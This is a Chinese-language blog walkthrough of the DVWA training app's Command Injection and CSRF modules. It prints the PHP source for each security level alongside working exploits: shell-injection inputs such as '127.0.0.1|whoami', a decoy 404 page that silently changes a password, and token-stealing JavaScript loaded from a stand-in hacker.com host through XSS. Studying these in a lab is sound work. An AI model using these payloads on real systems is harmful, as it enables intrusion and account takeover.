---
layout: post
title: "DVWA-Learning-Notes"
subtitle: "DVWA-Command Injection"
date: 2019-02-24
author: ppbibo
category: security
finished: true
---
[TOC]

DVWA 深入学习(持续更新)



DVWA-Command Injection

##### LOW

[*] vulnerabilities/exec/source/low.php

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 

# stristr(“hello world”,"world");
// 查找world在hello world 第一次出现，并返回字符串的剩余部分。

# php_uname( 's' );
// 返回操作系统名称        
// 详见：http://www.php.net/manual/zh/function.php-uname.php

# shell_exec(string $cmd)： string
// 执行系统命令

[*]
exec只能获取最后一行数据，shell_execu则可以获取全部数据。

[*]
$target 变量没有进行任何效验，直接把输入的字段和 ping 做了拼接，linux下如果不加-c 的话会一直ping下去而不会像win下四次后自己结束。

[POST]
http://10.211.55.7/web/dvwa-master/vulnerabilities/exec/
Cookie: security=low; PHPSESSID=2f9ju9pjdi8joth8tmjbu30pc1
ip=127.0.0.1+&&+whoami&Submit=Submit

ppbibo4a3e\administrator
```

##### Medium

[*] vulnerabilities/exec/source/medium.php

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 

#  str_replace("world","Shanghai","Hello world!");
// 把字符Hello world! 中的world 替换成Shanghai

# array_keys() 
// 函数返回包含数组中所有键名的一个新数组

[*] 代码将变量$target进行了效验，即把 ”&&” , ”;” 替换成空字符串 ，采用的是黑名单机制，但是依旧存在安全问题。

[POST]
http://10.211.55.7/web/dvwa-master/vulnerabilities/exec/#
Cookie: security=medium; PHPSESSID=2f9ju9pjdi8joth8tmjbu30pc1
ip=127.0.0.1+&+whoami&Submit=Submit

ppbibo4a3e\administrator
```

##### High

vulnerabilities/exec/source/high.php

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 

# 同样采用的是黑名单机制，但是依旧存在安全问题，看样子过滤了所有的非法字符，但是仔细观察到是把 ”| ”（ |后有一个空格 ）替换为空字符，于是就可以有利用  ”|” 进行攻击

[POST]
http://10.211.55.7/web/dvwa-master/vulnerabilities/exec/
Cookie: security=high; PHPSESSID=2f9ju9pjdi8joth8tmjbu30pc1
ip=127.0.0.1|whoami&Submit=Submit
```

##### impossible

vulnerabilities/exec/source/impossible.php

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target ); // stripslashes() 删除反斜杠：

    // Split the IP into 4 octects
    $octet = explode( ".", $target ); 

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 

# explode() 
// 把字符串打散为数组：

# is_numeric()
// 如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。

[*]
# 将IP拆分为4个八分位数
# 检查每个八位字节是否为整数
# 如果所有4个八位字节都是int，则将IP放回一起
# 否则输出 ERROR: You have entered an invalid IP.
```

DVWA-CSRF

##### LOW

vulnerabilities/csrf/source/LOW.php

```php+HTML
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 

# 服务器通过GET方式接收修改密码的请求
# 判断参数password_new与password_conf是否相同
# 如果相同，就会修改密码
# 没有任何的防CSRF机制
#（当然服务器对请求的发送者是做了身份验证的，检查Cookie，此代码并没有展现）。

[Exploit]

[1]构造如下链接：
http://10.211.55.7/web/dvwa-master/vulnerabilities/csrf/?password_new=hacker123&password_conf=hacker123&Change=Change#
PS: 用户点击此链接就会将他自己的密码更改为hacker123

[2]使用短链接来隐藏 URL：
为了更接近实战性使被害者更容易相信此链接是安全的，我们使用短链接来隐蔽此链接
http://t.cn/EftY6NG
PS: 短网址生成网站 (http://dwz.wailian.work/)

[3]构造攻击页面：
通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，实现了受害者点击链接则会将密码修改。

构造demo.html如下:
<html>
<head>
<title>404 Not Found</title>
</head>
<body>
<img src="http://10.211.55.7/web/dvwa-master/vulnerabilities/csrf/?password_new=hacker123&password_conf=hacker123&Change=Change#" border="0" style="display:none;"/>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body>
</html>

用户正在浏览此网站（浏览器中还保存着session值）时，访问攻击者诱惑点击的链接则实现更改密码为hacker123
```

##### Medium

vulnerabilities/csrf/source/medium.php

```php+HTML
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 


#  stripos("hello php","PHP");
// 查找 PHP 在 hello php 中第一次出现的位置，无大小写区分

[*]PHP超全局变量$_SERVER中的两个值：
$_SERVER['HTTP_REFERER']：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。

$_SERVER['SERVER_NAME']：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。

[*] 上面的代码使用 stripos() 函数来检查 HTTP 头, 过滤规则是$_SERVER['HTTP_REFERER']的值中必须包含$_SERVER['SERVER_NAME'],以此来抵御CSRF攻击。
```

用户正常修改密码发送的请求包

```bash
GET /web/dvwa-master/vulnerabilities/csrf/?password_new=hacker123&password_conf=hacker123&Change=Change HTTP/1.1
HOST: 10.211.55.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html
Accept-Language: zh-CN
Referer: http://10.211.55.7/web/dvwa-master/vulnerabilities/csrf/
Cookie: security=medium; PHPSESSID=2f9ju9pjdi8joth8tmjbu30pc1
Upgrade-Insecure-Requests: 1
```

[Exploit]

```bash
将LOW等级中构造的攻击页面demo.html 复制一份命名为 10.211.55.7.html
我们按照LOW等级中的方法再一次实施攻击，诱惑用户点击攻击者构造的链接http://hacker.com/demo.html（未重命名的文件）请求的数据包如下

[request]
GET /web/dvwa-master/vulnerabilities/csrf/?password_new=hacker123&password_conf=hacker123&Change=Change HTTP/1.1
HOST: 10.211.55.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html
Accept-Language: zh-CN
Referer: http://hacker.com/demo.html
Cookie: security=medium; PHPSESSID=2f9ju9pjdi8joth8tmjbu30pc1
Upgrade-Insecure-Requests: 1

[response]
...
That request didn't look correet
# 修改密码失败 (攻击失败)
...

[*]
此时用户访问 10.211.55.7.html 文件，即相当于在Repeater中修改HTTP数据包中的Referer 参数为 http://hacker.com/10.211.55.7.html 因此符合过滤规则           $_SERVER['HTTP_REFERER'] 的值中必须包含 $_SERVER['SERVER_NAME']
# 成功修改用户密码 (攻击成功)
```

##### High

vulnerabilities/csrf/source/high.php

```php+HTML
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?> 

# 代码中加入了Anti-CSRF token机制，用户每次访问修改密码页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。

[Exploit]
[1] 要绕过High等级的反CSRF机制，关键是要获取token，要利用被害用户的cookie去修改密码的页面获取token。

[2] 构造攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成 CSRF 攻击，下面是代码。
```

[demo.js]

```
alert(document.cookie);
var theUrl = 'http://10.211.55.7/web/dvwa-master/vulnerabilities/csrf/';
	if(window.XMLHttpRequest) {
		xmlhttp = new XMLHttpRequest();
	}else{
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
var count = 0;
	xmlhttp.withCredentials = true;
	xmlhttp.onreadystatechange=function(){
		if(xmlhttp.readyState ==4 && xmlhttp.status==200)
		{
			var text = xmlhttp.responseText;
			var regex = /user_token\' value\=\'(.*?)\' \/\>/;
			var match = text.match(regex);
			console.log(match);
			alert(match[1]);
                var token = match[1];
                
					var new_url = 'http://10.211.55.7/web/dvwa-master/vulnerabilities/csrf/?user_token='+token+'&password_new=hacker123&password_conf=hacker123&Change=Change';
					if(count==0){
						count++;
						xmlhttp.open("GET",new_url,false);
						xmlhttp.send();
					}
					

		}
	};
	xmlhttp.open("GET",theUrl,false);
	xmlhttp.send();
```

== 分割线 ==

```
[3] demo.js放置于攻击者的网站上 http://hacker.com/demo.js 
[*] DOM XSS 与 CSRF 结合：
http://10.211.55.7/web/dvwa-master/vulnerabilities/xss_d/?default=English# <script>src="http://hacker.com/demo.js"</script>

# 诱导点击后，成功将密码修改为hacker123
```

##### Impossible

vulnerabilities/csrf/source/impossible.php

```php+HTML
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $pass_curr = $_GET[ 'password_current' ];
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Sanitise current password input
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass_curr = md5( $pass_curr );

    // Check that the current password is correct
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );
    $data->execute();

    // Do both new passwords match and does the current password match the user?
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {
        // It does!
        $pass_new = stripslashes( $pass_new );
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update database with new password
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );
        $data->execute();

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match or current password incorrect.</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 

# 代码中使用了PDO预处理的方式用来防御SQL注入攻击，修改密码功能添加了一个输入原始密码的表单，攻击者在不知道原始密码的前提下是无法进行CSRF攻击的。
```